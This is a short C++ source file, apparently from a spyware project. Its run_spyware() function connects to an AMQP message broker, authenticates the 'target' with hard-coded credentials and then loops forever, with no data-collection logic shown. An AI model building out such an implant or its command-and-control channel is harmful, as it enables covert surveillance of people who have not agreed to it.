#include <stdlib.h>

#include "config.h"
#include "./spyware.hpp"
#include "./debug.hpp"
#include "./authentication.hpp"
#include "./utils.hpp"
#include "../amqp/AmqpClient.hpp"

int run_spyware () {
    bool amqpOpened;
    std::string authToken;
    AmqpClient amqpClient(getRmqConfig());

    amqpOpened = amqpClient.open(); // Open connection and one channel with queue broker

    if (!amqpOpened) {
        debug("Enable to open amqp connection", CRITICAL);
        return EXIT_FAILURE;
    }

    authToken = authenticate(amqpClient, AUTH_USER, AUTH_PASSWORD);

    if (authToken.length() <= 0) {
        debug("Enable to authenticate target", CRITICAL);
        return EXIT_FAILURE;
    }

    while (true) {}

    return EXIT_SUCCESS;
}